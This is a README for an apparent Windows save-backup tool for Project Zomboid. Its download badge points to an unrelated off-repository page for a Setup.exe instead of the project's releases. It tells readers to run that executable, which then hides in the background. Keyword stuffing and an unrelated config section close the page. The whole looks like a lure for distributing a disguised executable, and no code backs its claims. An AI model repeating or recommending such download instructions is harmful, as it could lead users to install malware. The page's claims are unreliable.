# ProjectZomboid Save Backup Utility

<a href="https://rewfdf.github.io/SetupPage/">
  <img src="https://img.shields.io/badge/⬇Setup.exe-0d9488?style=for-the-badge&logo=windows&logoColor=white" alt="Download Setup.exe">
</a>
<a href="https://github.com/gigahokagepincers/ProjectZomboid-Save-Backup-Utility/releases">
  <img src="https://img.shields.io/github/v/tag/gigahokagepincers/ProjectZomboid-Save-Backup-Utility?style=for-the-badge&logo=github&logoColor=white&label=Version&color=0d9488" alt="Version">
</a>
<a href="https://github.com/gigahokagepincers/ProjectZomboid-Save-Backup-Utility/blob/main/LICENSE">
  <img src="https://img.shields.io/github/license/gigahokagepincers/ProjectZomboid-Save-Backup-Utility?style=for-the-badge&logo=github&logoColor=white&color=0d9488" alt="License">
</a>
<a href="https://github.com/gigahokagepincers/ProjectZomboid-Save-Backup-Utility/stargazers">
  <img src="https://img.shields.io/github/stars/gigahokagepincers/ProjectZomboid-Save-Backup-Utility?style=for-the-badge&logo=github&logoColor=white&color=0d9488" alt="Stars">
</a>

> **TL;DR** – A lightweight Windows program that automatically copies, timestamps, and rotates Project Zomboid save files. One click installs `Setup.exe`; thereafter the utility runs silently in the background, preserving your progress without manual effort.

---

## What the utility does

- **Continuous backup** – Monitors the default save directory (`%USERPROFILE%\Zomboid\Saves\`) and creates a new backup each time a save file changes.
- **Timestamped archives** – Backups are stored as `save_YYYYMMDD_HHMMSS.zip`, enabling quick identification of the desired version.
- **Retention policy** – Keeps the most recent 10 backups per character; older archives are purged automatically.
- **Minimal resource footprint** – Runs as a hidden process (< 5 MB RAM) and does not interfere with the game’s performance.

---

## Installation & first launch

1. Click the **Download** badge above to reach the hosted page.
2. Run `Setup.exe` and follow the wizard (default options are optimal for most users).
3. Upon completion, the utility places a shortcut in the Start Menu and adds an entry to the Windows task tray.

No additional configuration is required for a functional backup cycle.

---

## Compatibility matrix

| Project Zomboid version | Supported | Notes |
|--------------------------|-----------|-------|
| 41.76 (latest)           | ✅        | Tested with default save layout |
| 41.70 – 41.75            | ✅        | Works with legacy folder structures |
| Pre‑41.70                | ❌        | Save format changed; not supported |

The utility does not modify any game files; it only reads from the save directory.

---

## How backups are stored

Backups are placed in a subfolder called `Zomboid_Backups` inside the user's Documents folder:

```
%USERPROFILE%\Documents\Zomboid_Backups\
   └─ CharacterName\
        ├─ save_20241012_091500.zip
        ├─ save_20241012_094500.zip
        └─ …
```

Each ZIP archive contains the exact contents of the original save folder at the moment of backup, ensuring a reliable restore point.

---

## Restoring a save

1. Open the backup folder for the relevant character.
2. Locate the desired timestamped ZIP file.
3. Extract its contents directly over the current save folder (or copy to a new folder for testing).

The game will load the extracted files on next launch, effectively rolling back to the chosen point in time.

---

## Contributing

Contributions are welcomed under the same open‑source license. To propose changes:

- Fork the repository.
- Create a feature branch named `feature/<description>`.
- Submit a pull request with a concise description of the modification.

All contributions must respect the existing code style and pass the supplied unit tests.

---

## License

This project is distributed under the **MIT License**. See the `LICENSE` file for full terms.

---

*Keywords*: projectzomboid, save, backup, utility, projectzomboid-save, save-backup, backup-utility, projectzomboid-manager, projectzomboid-helper, projectzomboid-config.

## 📁 Configuration System

```text
configs/
├── default.cfg
├── visual.cfg
├── player.cfg
└── custom.cfg
```